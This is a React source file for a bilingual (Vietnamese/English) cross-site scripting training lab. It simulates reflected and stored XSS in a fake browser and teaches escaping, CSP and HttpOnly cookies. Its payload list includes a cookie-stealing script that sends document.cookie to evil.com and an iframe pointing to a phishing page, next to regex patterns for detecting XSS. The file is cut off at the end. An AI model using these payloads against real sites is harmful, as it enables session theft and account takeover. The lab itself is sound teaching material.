import React, { useState, useEffect, useRef, useCallback } from 'react'
import { useOutletContext } from 'react-router-dom'
import { useLanguage } from '../../context/LanguageContext'
import AIInput from '../../components/common/AIInput'

/* ──────────────────────────────────────
   XSS DETECTION & SANITIZATION
   ────────────────────────────────────── */
const XSS_PATTERNS = [
    { regex: /<script[\s>]/i, type: 'script_tag', severity: 'critical' },
    { regex: /on\w+\s*=/i, type: 'event_handler', severity: 'high' },
    { regex: /javascript\s*:/i, type: 'js_protocol', severity: 'high' },
    { regex: /<img[^>]+onerror/i, type: 'img_onerror', severity: 'high' },
    { regex: /<iframe/i, type: 'iframe', severity: 'critical' },
    { regex: /<svg[^>]*onload/i, type: 'svg_onload', severity: 'high' },
    { regex: /eval\s*\(/i, type: 'eval', severity: 'critical' },
    { regex: /document\.(cookie|location|write)/i, type: 'dom_access', severity: 'high' },
    { regex: /<\/?(style|link|meta|base|object|embed|form)/i, type: 'dangerous_tag', severity: 'medium' },
    { regex: /expression\s*\(/i, type: 'css_expression', severity: 'medium' },
]

function detectXSS(input) {
    const found = []
    for (const pattern of XSS_PATTERNS) {
        if (pattern.regex.test(input)) {
            found.push(pattern)
        }
    }
    return found
}

function sanitizeHTML(input) {
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
}

/* ──────────────────────────────────────
   XSS PAYLOAD EXAMPLES
   ────────────────────────────────────── */
const XSS_EXAMPLES = [
    { label: 'Basic script', payload: '<script>alert("XSS")</script>', category: 'reflected' },
    { label: 'IMG onerror', payload: '<img src=x onerror=alert("XSS")>', category: 'reflected' },
    { label: 'SVG onload', payload: '<svg onload=alert("XSS")>', category: 'reflected' },
    { label: 'Event handler', payload: '<div onmouseover=alert("XSS")>Hover me</div>', category: 'reflected' },
    { label: 'JS protocol', payload: '<a href="javascript:alert(\'XSS\')">Click</a>', category: 'reflected' },
    { label: 'Cookie steal', payload: '<script>new Image().src="https://evil.com/?c="+document.cookie</script>', category: 'stored' },
    { label: 'Iframe inject', payload: '<iframe src="https://evil.com/phish.html"></iframe>', category: 'stored' },
    { label: 'DOM innerHTML', payload: '<img src=x onerror="document.body.innerHTML=\'<h1>Hacked!</h1>\'">', category: 'dom' },
]

/* ──────────────────────────────────────
   THEORY SIDEBAR
   ────────────────────────────────────── */
function XSSTheory({ lang }) {
    if (lang === 'vi') {
        return (
            <>
                <h3>XSS là gì?</h3>
                <p>
                    Cross-Site Scripting (XSS) là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript
                    độc hại vào trang web, từ đó thực thi trong trình duyệt của nạn nhân.
                </p>

                <h3>3 loại XSS</h3>
                <ul>
                    <li><strong>Reflected XSS</strong> — Payload nằm trong URL/request, phản hồi lại trong response. Nạn nhân click link độc.</li>
                    <li><strong>Stored XSS</strong> — Payload được lưu vào database (comment, profile...), tự động thực thi khi ai đó xem trang.</li>
                    <li><strong>DOM-based XSS</strong> — Payload thao tác trực tiếp DOM phía client mà không qua server.</li>
                </ul>

                <h3>Hậu quả</h3>
                <ul>
                    <li>🍪 Đánh cắp cookie/session</li>
                    <li>🔑 Chiếm quyền tài khoản</li>
                    <li>📝 Giả mạo nội dung trang</li>
                    <li>🎣 Phishing (trang đăng nhập giả)</li>
                    <li>🦠 Phát tán malware</li>
                </ul>

                <h3>Phòng chống</h3>
                <ul>
                    <li>✅ <strong>Escape output</strong> — &lt; → &amp;lt; &gt; → &amp;gt;</li>
                    <li>✅ <strong>CSP Headers</strong> — Content-Security-Policy</li>
                    <li>✅ <strong>HttpOnly cookies</strong> — JS không thể đọc cookie</li>
                    <li>✅ <strong>Input validation</strong> — Lọc/whitelist input</li>
                    <li>✅ <strong>textContent</strong> thay vì innerHTML</li>
                </ul>

                <div className="lab-theory-note danger">
                    🚨 XSS là lỗ hổng phổ biến #1 trên web (OWASP Top 10). Mọi ứng dụng web đều có thể bị nếu không xử lý input đúng cách.
                </div>

                <div className="lab-theory-note success">
                    ✅ Lab này hoàn toàn an toàn — mọi demo đều chạy trong sandbox, không có mã nào thực thi thật.
                </div>
            </>
        )
    }

    return (
        <>
            <h3>What is XSS?</h3>
            <p>
                Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject
                malicious JavaScript into web pages, executing it in victims' browsers.
            </p>

            <h3>3 Types of XSS</h3>
            <ul>
                <li><strong>Reflected XSS</strong> — Payload in URL/request, reflected back in response. Victim clicks malicious link.</li>
                <li><strong>Stored XSS</strong> — Payload saved to database (comments, profiles...), auto-executes when anyone views the page.</li>
                <li><strong>DOM-based XSS</strong> — Payload manipulates client-side DOM directly without going through the server.</li>
            </ul>

            <h3>Impact</h3>
            <ul>
                <li>🍪 Cookie/session theft</li>
                <li>🔑 Account takeover</li>
                <li>📝 Page content manipulation</li>
                <li>🎣 Phishing (fake login pages)</li>
                <li>🦠 Malware distribution</li>
            </ul>

            <h3>Prevention</h3>
            <ul>
                <li>✅ <strong>Escape output</strong> — &lt; → &amp;lt; &gt; → &amp;gt;</li>
                <li>✅ <strong>CSP Headers</strong> — Content-Security-Policy</li>
                <li>✅ <strong>HttpOnly cookies</strong> — JS can't read cookies</li>
                <li>✅ <strong>Input validation</strong> — Filter/whitelist input</li>
                <li>✅ <strong>textContent</strong> instead of innerHTML</li>
            </ul>

            <div className="lab-theory-note danger">
                🚨 XSS is the #1 most common web vulnerability (OWASP Top 10). Every web app is vulnerable if inputs aren't handled properly.
            </div>

            <div className="lab-theory-note success">
                ✅ This lab is completely safe — all demos run in a sandbox, no code actually executes.
            </div>
        </>
    )
}

/* ──────────────────────────────────────
   FAKE BROWSER COMPONENT
   ────────────────────────────────────── */
function FakeBrowser({ url, children, title }) {
    return (
        <div style={{
            borderRadius: 10, overflow: 'hidden',
            border: '1px solid var(--lab-border)',
            background: '#1a1a2e',
        }}>
            {/* Browser chrome */}
            <div style={{
                display: 'flex', alignItems: 'center', gap: '0.75rem',
                padding: '0.5rem 1rem', background: '#12121f',
                borderBottom: '1px solid var(--lab-border)',
            }}>
                <div style={{ display: 'flex', gap: 6 }}>
                    <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
                    <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#febc2e' }} />
                    <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#28c840' }} />
                </div>
                <div style={{
                    flex: 1, background: 'rgba(255,255,255,0.06)', borderRadius: 4,
                    padding: '0.3rem 0.75rem', fontSize: '0.75rem', color: 'var(--lab-text-dim)',
                    fontFamily: 'monospace', display: 'flex', alignItems: 'center', gap: '0.5rem',
                }}>
                    <span style={{ color: 'var(--lab-green)', fontSize: '0.7rem' }}>🔒</span>
                    {url || 'https://example.com'}
                </div>
                {title && <span style={{ fontSize: '0.7rem', color: 'var(--lab-text-dim)' }}>{title}</span>}
            </div>
            {/* Page content */}
            <div style={{
                padding: '1.25rem', background: '#fafafa',
                minHeight: 100, color: '#222',
                fontSize: '0.88rem', lineHeight: 1.6,
            }}>
                {children}
            </div>
        </div>
    )
}

/* ──────────────────────────────────────
   MAIN COMPONENT
   ────────────────────────────────────── */
export default function XSSLab() {
    const { t, lang } = useLanguage()
    const { setTheory, setLabContext } = useOutletContext()

    // State
    const [activeTab, setActiveTab] = useState('reflected')
    const [reflectedInput, setReflectedInput] = useState('')
    const [isVulnerable, setIsVulnerable] = useState(true)
    const [storedComments, setStoredComments] = useState([
        { user: 'Alice', text: 'Great article! Very informative.', time: '2 min ago' },
        { user: 'Bob', text: 'Thanks for sharing this!', time: '5 min ago' },
    ])
    const [newComment, setNewComment] = useState('')
    const [domInput, setDomInput] = useState('')
    const [alertLog, setAlertLog] = useState([])

    // Set theory
    useEffect(() => {
        setTheory(<XSSTheory lang={lang} />)
    }, [setTheory, lang])

    // Push lab context to Mentor Chat
    useEffect(() => {
        if (setLabContext) {
            const ctx = [
                `Lab: XSS (Cross-Site Scripting)`,
                `Mode: ${isVulnerable ? 'VULNERABLE' : 'SAFE'}`,
                `Tab: ${activeTab}`,
                activeTab === 'reflected' && reflectedInput ? `Reflected payload: "${reflectedInput}"` : '',
                activeTab === 'stored' && newComment ? `Stored comment payload: "${newComment}"` : '',
                alertLog.length > 0 ? `Attack log entries: ${alertLog.length}` : '',
            ].filter(Boolean).join('. ')
            setLabContext(ctx)
        }
    }, [isVulnerable, activeTab, reflectedInput, newComment, alertLog, setLabContext])

    // Log intercepted "alert" calls
    const logAlert = useCallback((msg) => {
        setAlertLog(prev => [...prev, { time: new Date().toLocaleTimeString(), message: msg }])
    }, [])

    // Detect XSS in current input
    const reflectedDetections = detectXSS(reflectedInput)
    const commentDetections = detectXSS(newComment)

    // Render reflected output
    const renderReflectedOutput = () => {
        if (!reflectedInput) return null
        if (isVulnerable) {
            // Show raw HTML (but safely — we display what WOULD render)
            const hasXSS = reflectedDetections.length > 0
            return (
                <div>
                    <div style={{ marginBottom: 8, fontWeight: 600, color: '#333' }}>
                        {lang === 'vi' ? 'Kết quả tìm kiếm cho:' : 'Search results for:'}
                    </div>
                    {/* This shows what the vulnerable site WOULD render */}
                    <div style={{
                        padding: '0.75rem', background: hasXSS ? '#fff0f0' : '#f0f8ff',
                        border: `1px solid ${hasXSS ? '#ffcccc' : '#cce5ff'}`,
                        borderRadius: 4, fontFamily: 'monospace', fontSize: '0.82rem',
                        wordBreak: 'break-all',
                    }}>
                        <span style={{ color: '#888' }}>{'<p>'}</span>
                        <span style={{ color: hasXSS ? '#d00' : '#333' }}>{reflectedInput}</span>
                        <span style={{ color: '#888' }}>{'</p>'}</span>
                    </div>
                    {hasXSS && (
                        <div style={{
                            marginTop: 8, padding: '0.5rem 0.75rem',
                            background: '#ffe0e0', borderRadius: 4,
                            fontSize: '0.78rem', color: '#c00', fontWeight: 600,
                        }}>
                            ⚠️ {lang === 'vi'
                                ? 'XSS sẽ thực thi! Trình duyệt sẽ chạy mã JavaScript độc hại.'
                                : 'XSS would execute! Browser would run malicious JavaScript.'
                            }
                        </div>
                    )}
                </div>
            )
        } else {
            // Safe mode — escaped
            return (
                <div>
                    <div style={{ marginBottom: 8, fontWeight: 600, color: '#333' }}>
                        {lang === 'vi' ? 'Kết quả tìm kiếm cho:' : 'Search results for:'}
                    </div>
                    <div style={{
                        padding: '0.75rem', background: '#f0fff0',
                        border: '1px solid #ccffcc', borderRadius: 4,
                        fontSize: '0.82rem', wordBreak: 'break-all',
                    }}>
                        {sanitizeHTML(reflectedInput)}
                    </div>
                    <div style={{
                        marginTop: 8, padding: '0.5rem 0.75rem',
                        background: '#e0ffe0', borderRadius: 4,
                        fontSize: '0.78rem', color: '#070', fontWeight: 600,
                    }}>
                        ✅ {lang === 'vi'
                            ? 'An toàn! HTML đã được escape, script không thể thực thi.'
                            : 'Safe! HTML is escaped, script cannot execute.'
                        }
                    </div>
                </div>
            )
        }
    }

    // Add comment (stored XSS demo)
    const handleAddComment = () => {
        if (!newComment.trim()) return
        const hasXSS = commentDetections.length > 0
        setStoredComments(prev => [{
            user: 'You (Attacker)',
            text: newComment,
            time: 'Just now',
            isXSS: hasXSS && isVulnerable,
        }, ...prev])
        if (hasXSS && isVulnerable) {
            logAlert(`Stored XSS payload: ${newComment.slice(0, 50)}...`)
        }
        setNewComment('')
    }

    return (
        <div className="lab-animate-in">
            {/* Title */}
            <div className="lab-section">
                <h2 className="lab-section-title" style={{ fontSize: '1.3rem' }}>
                    💉 {t('lab_xss_title')}
                </h2>
                <p style={{ color: 'var(--lab-text-dim)', fontSize: '0.9rem', marginBottom: '1.5rem' }}>
                    {t('lab_xss_desc')}
                </p>
            </div>

            {/* Mode Toggle */}
            <div className="lab-toggle-group">
                <button
                    className={`lab-toggle-opt ${isVulnerable ? 'active-vuln' : ''}`}
                    onClick={() => setIsVulnerable(true)}
                >
                    🔓 {lang === 'vi' ? 'Chế độ LỖ HỔNG' : 'VULNERABLE Mode'}
                </button>
                <button
                    className={`lab-toggle-opt ${!isVulnerable ? 'active-safe' : ''}`}
                    onClick={() => setIsVulnerable(false)}
                >
                    🔒 {lang === 'vi' ? 'Chế độ AN TOÀN' : 'SAFE Mode'}
                </button>
            </div>

            {/* Section Tabs */}
            <div className="lab-tabs">
                {[
                    { id: 'reflected', label: lang === 'vi' ? '🔄 Reflected XSS' : '🔄 Reflected XSS' },
                    { id: 'stored', label: lang === 'vi' ? '💾 Stored XSS' : '💾 Stored XSS' },
                    { id: 'prevention', label: lang === 'vi' ? '🛡️ Phòng chống' : '🛡️ Prevention' },
                ].map(tab => (
                    <button key={tab.id} className={`lab-tab ${activeTab === tab.id ? 'active' : ''}`}
                        onClick={() => setActiveTab(tab.id)}>
                        {tab.label}
                    </button>
                ))}
            </div>

            {/* ═══════ TAB 1: Reflected XSS ═══════ */}
            {activeTab === 'reflected' && (
                <div style={{ display: 'grid', gap: '1.5rem' }}>
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            🔄 Reflected XSS {lang === 'vi' ? '— Phản hồi trong URL' : '— Reflected in URL'}
                        </h3>
                        <p style={{ color: 'var(--lab-text-dim)', fontSize: '0.85rem', marginBottom: '1rem' }}>
                            {lang === 'vi'
                                ? 'Mô phỏng: Trang tìm kiếm bị lỗ hổng — input người dùng được chèn thẳng vào HTML mà không escape.'
                                : 'Simulation: A vulnerable search page — user input is inserted directly into HTML without escaping.'
                            }
                        </p>

                        {/* Input */}
                        <div className="lab-input-group">
                            <label className="lab-input-label">
                                🔍 {lang === 'vi' ? 'Ô tìm kiếm (AI Auto-Suggest)' : 'Search box (AI Auto-Suggest)'}
                            </label>
                            <AIInput
                                labType="xss"
                                className="lab-input"
                                value={reflectedInput}
                                onChange={e => setReflectedInput(e.target.value)}
                                placeholder={lang === 'vi' ? 'Thử nhập: <script>alert("XSS")</script>' : 'Try: <script>alert("XSS")</script>'}
                            />
                        </div>

                        {/* Quick payload buttons */}
                        <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', marginBottom: '1rem' }}>
                            {XSS_EXAMPLES.filter(e => e.category === 'reflected').map((ex, i) => (
                                <button key={i} className="lab-btn lab-btn-secondary"
                                    style={{ fontSize: '0.72rem', padding: '0.25rem 0.6rem' }}
                                    onClick={() => setReflectedInput(ex.payload)}>
                                    {ex.label}
                                </button>
                            ))}
                        </div>
                    </div>

                    {/* Fake browser showing result */}
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            🌐 {lang === 'vi' ? 'Trình duyệt nạn nhân' : 'Victim\'s Browser'}
                        </h3>
                        <FakeBrowser
                            url={`https://shop.example.com/search?q=${encodeURIComponent(reflectedInput).slice(0, 40)}${reflectedInput.length > 40 ? '...' : ''}`}
                            title={isVulnerable ? '⚠️ VULNERABLE' : '✅ SAFE'}
                        >
                            <div style={{ fontWeight: 700, fontSize: '1.1rem', marginBottom: 12, color: '#1a73e8' }}>
                                🛒 ShopExample.com
                            </div>
                            {renderReflectedOutput()}
                            {!reflectedInput && (
                                <div style={{ color: '#999', fontStyle: 'italic' }}>
                                    {lang === 'vi' ? 'Nhập từ khóa tìm kiếm ở trên...' : 'Enter a search query above...'}
                                </div>
                            )}
                        </FakeBrowser>
                    </div>

                    {/* Detection panel */}
                    {reflectedDetections.length > 0 && (
                        <div className="lab-visual-panel">
                            <h3 className="lab-section-title">
                                🔍 {lang === 'vi' ? 'Phát hiện XSS' : 'XSS Detection'}
                            </h3>
                            <div style={{ display: 'grid', gap: '0.5rem' }}>
                                {reflectedDetections.map((d, i) => (
                                    <div key={i} style={{
                                        display: 'flex', alignItems: 'center', gap: '0.75rem',
                                        padding: '0.6rem 0.9rem', borderRadius: 6,
                                        background: d.severity === 'critical' ? 'var(--lab-red-dim)' :
                                            d.severity === 'high' ? 'var(--lab-yellow-dim)' : 'rgba(0,0,0,0.1)',
                                        borderLeft: `3px solid ${d.severity === 'critical' ? 'var(--lab-red)' :
                                            d.severity === 'high' ? 'var(--lab-yellow)' : 'var(--lab-blue)'}`,
                                    }}>
                                        <span style={{ fontSize: '1.1rem' }}>
                                            {d.severity === 'critical' ? '🚨' : d.severity === 'high' ? '⚠️' : 'ℹ️'}
                                        </span>
                                        <div>
                                            <div style={{
                                                fontWeight: 700, fontSize: '0.85rem',
                                                color: d.severity === 'critical' ? 'var(--lab-red)' : 'var(--lab-yellow)',
                                            }}>
                                                {d.type.replace(/_/g, ' ').toUpperCase()}
                                            </div>
                                            <div style={{ fontSize: '0.75rem', color: 'var(--lab-text-dim)' }}>
                                                {lang === 'vi' ? `Mức độ: ${d.severity}` : `Severity: ${d.severity}`}
                                            </div>
                                        </div>
                                        <span style={{
                                            marginLeft: 'auto', padding: '0.15rem 0.5rem', borderRadius: 100,
                                            fontSize: '0.68rem', fontWeight: 700,
                                            background: d.severity === 'critical' ? 'var(--lab-red-dim)' : 'var(--lab-yellow-dim)',
                                            color: d.severity === 'critical' ? 'var(--lab-red)' : 'var(--lab-yellow)',
                                        }}>
                                            {d.severity.toUpperCase()}
                                        </span>
                                    </div>
                                ))}
                            </div>

                            {/* Server-side code comparison */}
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '1.25rem' }}>
                                <div>
                                    <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-red)', marginBottom: '0.4rem', textTransform: 'uppercase' }}>
                                        ❌ {lang === 'vi' ? 'Code LỖ HỔNG' : 'VULNERABLE Code'}
                                    </div>
                                    <div className="lab-code">
                                        <span className="comment">{'// ❌ Server-side (dangerous!)'}</span>{'\n'}
                                        <span className="keyword">app</span>.get(<span className="string">'/search'</span>, (req, res) {'=> {'}{'\n'}
                                        {'  '}res.send(<span className="danger-hl">{`\`<p>\${req.query.q}</p>\``}</span>){'\n'}
                                        {'}'})
                                    </div>
                                </div>
                                <div>
                                    <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-green)', marginBottom: '0.4rem', textTransform: 'uppercase' }}>
                                        ✅ {lang === 'vi' ? 'Code AN TOÀN' : 'SAFE Code'}
                                    </div>
                                    <div className="lab-code">
                                        <span className="comment">{'// ✅ Server-side (escaped)'}</span>{'\n'}
                                        <span className="keyword">app</span>.get(<span className="string">'/search'</span>, (req, res) {'=> {'}{'\n'}
                                        {'  '}res.send(<span className="safe-hl">{`\`<p>\${escape(req.query.q)}</p>\``}</span>){'\n'}
                                        {'}'})
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            )}

            {/* ═══════ TAB 2: Stored XSS ═══════ */}
            {activeTab === 'stored' && (
                <div style={{ display: 'grid', gap: '1.5rem' }}>
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            💾 Stored XSS {lang === 'vi' ? '— Lưu trong database' : '— Persisted in Database'}
                        </h3>
                        <p style={{ color: 'var(--lab-text-dim)', fontSize: '0.85rem', marginBottom: '1rem' }}>
                            {lang === 'vi'
                                ? 'Mô phỏng: Hệ thống bình luận bị lỗ hổng — comment được lưu và hiện cho TẤT CẢ người xem.'
                                : 'Simulation: A vulnerable comment system — comments are saved and shown to ALL viewers.'
                            }
                        </p>
                    </div>

                    {/* Fake blog with comments */}
                    <div className="lab-visual-panel">
                        <FakeBrowser url="https://blog.example.com/post/how-to-learn-coding" title={isVulnerable ? '⚠️ VULNERABLE' : '✅ SAFE'}>
                            {/* Blog post */}
                            <div style={{ borderBottom: '1px solid #eee', paddingBottom: 12, marginBottom: 16 }}>
                                <h2 style={{ fontSize: '1.3rem', color: '#1a1a2e', marginBottom: 4 }}>How to Learn Coding in 2026</h2>
                                <div style={{ fontSize: '0.78rem', color: '#999' }}>Posted by Admin · 1 hour ago</div>
                            </div>

                            {/* Comment form */}
                            <div style={{ marginBottom: 16 }}>
                                <div style={{ fontSize: '0.85rem', fontWeight: 600, color: '#333', marginBottom: 6 }}>
                                    💬 {lang === 'vi' ? 'Thêm bình luận' : 'Add a comment'}
                                </div>
                                <div style={{ display: 'flex', gap: 8 }}>
                                    <AIInput
                                        labType="xss"
                                        value={newComment}
                                        onChange={e => setNewComment(e.target.value)}
                                        placeholder={lang === 'vi' ? 'Viết bình luận... (thử chèn XSS!)' : 'Write a comment... (try injecting XSS!)'}
                                        style={{
                                            flex: 1, padding: '0.5rem 0.75rem', borderRadius: 4,
                                            border: '1px solid #ddd', fontSize: '0.85rem',
                                            background: commentDetections.length > 0 ? '#fff5f5' : 'white',
                                        }}
                                        onKeyDown={e => e.key === 'Enter' && handleAddComment()}
                                    />
                                    <button onClick={handleAddComment} style={{
                                        padding: '0.5rem 1rem', background: '#1a73e8', color: 'white',
                                        border: 'none', borderRadius: 4, cursor: 'pointer', fontWeight: 600,
                                    }}>
                                        {lang === 'vi' ? 'Gửi' : 'Post'}
                                    </button>
                                </div>
                                {/* Quick payloads */}
                                <div style={{ display: 'flex', gap: 4, marginTop: 6, flexWrap: 'wrap' }}>
                                    {XSS_EXAMPLES.filter(e => e.category === 'stored').map((ex, i) => (
                                        <button key={i} onClick={() => setNewComment(ex.payload)}
                                            style={{
                                                padding: '0.2rem 0.5rem', fontSize: '0.68rem',
                                                background: '#f5f5f5', border: '1px solid #ddd',
                                                borderRadius: 3, cursor: 'pointer', color: '#666',
                                            }}>
                                            {ex.label}
                                        </button>
                                    ))}
                                </div>
                            </div>

                            {/* Comments list */}
                            <div style={{ display: 'grid', gap: 8 }}>
                                {storedComments.map((comment, i) => (
                                    <div key={i} style={{
                                        padding: '0.6rem 0.9rem', background: comment.isXSS ? '#fff0f0' : '#f8f9fa',
                                        borderRadius: 6, border: `1px solid ${comment.isXSS ? '#ffcccc' : '#eee'}`,
                                    }}>
                                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                                            <span style={{ fontWeight: 600, fontSize: '0.82rem', color: comment.isXSS ? '#c00' : '#333' }}>
                                                {comment.user}
                                            </span>
                                            <span style={{ fontSize: '0.72rem', color: '#999' }}>{comment.time}</span>
                                        </div>
                                        <div style={{
                                            fontSize: '0.85rem', color: '#444',
                                            fontFamily: comment.isXSS ? 'monospace' : 'inherit',
                                            wordBreak: 'break-all',
                                        }}>
                                            {isVulnerable ? (
                                                <span>
                                                    {comment.text}
                                                    {comment.isXSS && (
                                                        <span style={{ color: '#c00', fontWeight: 700, display: 'block', marginTop: 4, fontSize: '0.78rem' }}>
                                                            ⚡ {lang === 'vi' ? 'JS sẽ thực thi khi người khác xem trang!' : 'JS would execute when others view this page!'}
                                                        </span>
                                                    )}
                                                </span>
                                            ) : (
                                                <span>{sanitizeHTML(comment.text)}</span>
                                            )}
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </FakeBrowser>
                    </div>

                    {/* Attack flow diagram */}
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            📋 {lang === 'vi' ? 'Luồng tấn công Stored XSS' : 'Stored XSS Attack Flow'}
                        </h3>
                        <div style={{ display: 'grid', gap: '0.5rem' }}>
                            {[
                                { step: 1, icon: '🦹', label: lang === 'vi' ? 'Attacker gửi comment chứa <script>' : 'Attacker submits comment with <script>', color: 'var(--lab-red)' },
                                { step: 2, icon: '💾', label: lang === 'vi' ? 'Server lưu vào database (KHÔNG escape)' : 'Server saves to database (NO escaping)', color: 'var(--lab-yellow)' },
                                { step: 3, icon: '👤', label: lang === 'vi' ? 'Nạn nhân truy cập trang blog' : 'Victim visits the blog page', color: 'var(--lab-blue)' },
                                { step: 4, icon: '⚡', label: lang === 'vi' ? 'Script tự động thực thi trong browser nạn nhân' : 'Script auto-executes in victim\'s browser', color: 'var(--lab-red)' },
                                { step: 5, icon: '🍪', label: lang === 'vi' ? 'Cookie bị gửi tới server hacker' : 'Cookie sent to hacker\'s server', color: 'var(--lab-red)' },
                            ].map((item, i) => (
                                <div key={i} style={{
                                    display: 'flex', alignItems: 'center', gap: '1rem',
                                    padding: '0.7rem 1rem', background: 'rgba(0,0,0,0.15)',
                                    borderRadius: 8, borderLeft: `3px solid ${item.color}`,
                                }}>
                                    <div style={{
                                        width: 30, height: 30, borderRadius: '50%', background: item.color,
                                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                                        fontSize: '0.75rem', fontWeight: 800, color: '#fff', flexShrink: 0,
                                    }}>{item.step}</div>
                                    <span style={{ fontSize: '1.1rem' }}>{item.icon}</span>
                                    <span style={{ fontSize: '0.85rem', color: 'var(--lab-heading)' }}>{item.label}</span>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Alert log */}
                    {alertLog.length > 0 && (
                        <div className="lab-visual-panel">
                            <h3 className="lab-section-title">
                                📜 {lang === 'vi' ? 'Log tấn công' : 'Attack Log'}
                            </h3>
                            <div style={{
                                background: '#0b0f19', borderRadius: 6, padding: '1rem',
                                fontFamily: "'JetBrains Mono', monospace", fontSize: '0.78rem',
                                maxHeight: 150, overflowY: 'auto',
                            }}>
                                {alertLog.map((log, i) => (
                                    <div key={i} style={{ color: 'var(--lab-red)', marginBottom: '0.3rem' }}>
                                        <span style={{ color: 'var(--lab-text-dim)' }}>[{log.time}]</span>{' '}
                                        <span style={{ color: 'var(--lab-yellow)' }}>XSS_DETECTED</span>: {log.message}
                                    </div>
                                ))}
                            </div>
                            <button className="lab-btn lab-btn-secondary" style={{ marginTop: '0.5rem', fontSize: '0.75rem' }}
                                onClick={() => setAlertLog([])}>
                                🗑️ Clear log
                            </button>
                        </div>
                    )}
                </div>
            )}

            {/* ═══════ TAB 3: Prevention ═══════ */}
            {activeTab === 'prevention' && (
                <div style={{ display: 'grid', gap: '1.5rem' }}>
                    {/* Prevention techniques */}
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            🛡️ {lang === 'vi' ? 'Kỹ thuật phòng chống XSS' : 'XSS Prevention Techniques'}
                        </h3>

                        <div style={{ display: 'grid', gap: '1.25rem' }}>
                            {/* 1. Output Encoding */}
                            <div>
                                <h4 style={{ color: 'var(--lab-green)', fontSize: '0.92rem', fontWeight: 700, marginBottom: '0.5rem' }}>
                                    1. Output Encoding / Escaping
                                </h4>
                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                                    <div>
                                        <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-red)', marginBottom: '0.3rem' }}>❌ VULNERABLE</div>
                                        <div className="lab-code">
                                            <span className="comment">{'// Direct insertion'}</span>{'\n'}
                                            element.<span className="danger-hl">innerHTML</span> = userInput{'\n'}
                                            {'\n'}
                                            <span className="comment">{'// Template literal'}</span>{'\n'}
                                            html = <span className="danger-hl">{`\`<div>\${userInput}</div>\``}</span>
                                        </div>
                                    </div>
                                    <div>
                                        <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-green)', marginBottom: '0.3rem' }}>✅ SAFE</div>
                                        <div className="lab-code">
                                            <span className="comment">{'// Text content only'}</span>{'\n'}
                                            element.<span className="safe-hl">textContent</span> = userInput{'\n'}
                                            {'\n'}
                                            <span className="comment">{'// React auto-escapes'}</span>{'\n'}
                                            <span className="safe-hl">{'<div>{userInput}</div>'}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* 2. CSP Headers */}
                            <div>
                                <h4 style={{ color: 'var(--lab-green)', fontSize: '0.92rem', fontWeight: 700, marginBottom: '0.5rem' }}>
                                    2. Content-Security-Policy (CSP)
                                </h4>
                                <div className="lab-code">
                                    <span className="comment">{'// HTTP Header'}</span>{'\n'}
                                    <span className="keyword">Content-Security-Policy</span>: {'\n'}
                                    {'  '}default-src <span className="string">'self'</span>;{'\n'}
                                    {'  '}script-src <span className="string">'self'</span> <span className="string">'nonce-abc123'</span>;{'\n'}
                                    {'  '}style-src <span className="string">'self'</span> <span className="string">'unsafe-inline'</span>;{'\n'}
                                    {'  '}img-src <span className="string">'self'</span> <span className="string">https:</span>;
                                </div>
                                <p style={{ fontSize: '0.8rem', color: 'var(--lab-text-dim)', marginTop: '0.5rem' }}>
                                    {lang === 'vi'
                                        ? 'CSP ngăn chặn inline scripts và chỉ cho phép load resources từ nguồn tin cậy.'
                                        : 'CSP prevents inline scripts and only allows loading resources from trusted sources.'
                                    }
                                </p>
                            </div>

                            {/* 3. HttpOnly Cookies */}
                            <div>
                                <h4 style={{ color: 'var(--lab-green)', fontSize: '0.92rem', fontWeight: 700, marginBottom: '0.5rem' }}>
                                    3. HttpOnly Cookies
                                </h4>
                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                                    <div>
                                        <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-red)', marginBottom: '0.3rem' }}>❌ JS ACCESSIBLE</div>
                                        <div className="lab-code">
                                            <span className="keyword">Set-Cookie</span>: session=abc123{'\n'}
                                            {'\n'}
                                            <span className="comment">{'// Attacker can steal:'}</span>{'\n'}
                                            <span className="danger-hl">document.cookie</span>{'\n'}
                                            <span className="comment">{'// → "session=abc123"'}</span>
                                        </div>
                                    </div>
                                    <div>
                                        <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-green)', marginBottom: '0.3rem' }}>✅ PROTECTED</div>
                                        <div className="lab-code">
                                            <span className="keyword">Set-Cookie</span>: session=abc123;{'\n'}
                                            {'  '}<span className="safe-hl">HttpOnly</span>; <span className="safe-hl">Secure</span>; SameSite=Strict{'\n'}
                                            {'\n'}
                                            <span className="comment">{'// JS cannot access!'}</span>{'\n'}
                                            document.cookie <span className="comment">{'// → ""'}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* 4. Input Validation */}
                            <div>
                                <h4 style={{ color: 'var(--lab-green)', fontSize: '0.92rem', fontWeight: 700, marginBottom: '0.5rem' }}>
                                    4. Input Validation & Sanitization
                                </h4>
                                <div className="lab-code">
